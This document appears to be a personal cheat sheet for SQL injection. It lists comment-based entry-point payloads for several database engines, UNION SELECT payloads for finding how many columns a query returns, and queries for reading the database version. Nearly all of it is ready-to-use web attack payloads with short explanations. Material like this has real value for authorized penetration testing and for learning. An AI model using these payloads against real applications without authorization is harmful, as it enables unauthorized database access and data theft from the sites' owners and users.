# Entry point
if the response is unchanged after one of these payloads - the parameter might be vulnerable to SQLi.

Oracle / MSSQL / PostgreSQL / MySQL / SQLite
```
 -- 
' -- 
" -- 
 /*
' /* 
" /* 
```
MySQL
```
 # 
' # 
" # 
```
<code style="color : green">SELECT role,fullname FROM users WHERE id='</code>
example query: SELECT role,fullname FROM users WHERE id='1' # '
# UNION attack
if data is returned in the response, the database can be enumerated using a union attack.
in this case, the first step is to figure out how many columns are returned by the query.
personally I like to supply an id or a username that does not exist so no row is returned,
and then unioning a row of my choice until it is returned by the application:
```
-1' UNION SELECT 1; # 
-1' UNION SELECT 1,2: # 
-1' UNION SELECT 1,2,3; # and so on ...
```
after some of the numbers we supplied are reflected in the response, we can replace them with
other builtin methods and attributes to further enumerate the database.

example query:
```diff
@@ SELECT name,issue_date,valid_until FROM tickets WHERE ticket_id=" @@ - -1" UNION SELECT 1,2,3 /* @@ " @@
```
# Version enumeration

PostgreSQL / MySQL / MariaDB
```
SELECT version()
```
MSSQL / MySQL
```
SELECT @@version
```
SQLite
```
SELECT sqlite_version()
```
Oracle
```
SELECT banner FROM v$version
SELECT version FROM v$instance
```
